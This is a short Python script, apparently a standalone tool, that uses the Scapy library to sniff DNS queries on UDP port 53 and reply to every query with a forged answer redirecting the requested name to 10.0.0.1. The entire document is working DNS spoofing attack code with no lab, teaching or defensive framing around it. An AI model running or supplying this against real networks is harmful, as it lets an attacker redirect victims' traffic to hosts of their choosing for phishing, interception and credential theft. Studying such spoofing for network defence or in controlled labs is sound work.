from scapy.all import *

def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, rdata='10.0.0.1'))
        send(spoofed_pkt, verbose=False)

sniff(filter="udp port 53", prn=dns_spoof)
